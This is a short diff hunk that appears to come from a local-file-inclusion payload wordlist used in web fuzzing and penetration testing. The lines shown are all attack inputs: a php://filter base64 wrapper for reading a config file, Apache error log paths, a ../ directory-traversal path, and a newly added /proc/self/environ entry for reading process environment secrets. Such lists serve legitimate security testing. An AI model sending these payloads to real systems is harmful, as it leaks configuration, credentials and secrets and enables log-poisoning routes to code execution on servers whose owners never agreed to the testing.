@@ -54,3 +54,4 @@ php://filter/convert.base64-encode/resource=config
 /var/log/httpd/error_log
 /var/log/httpd/error.log
 ../../../../../var/log/httpd/error_log
+/proc/self/environ
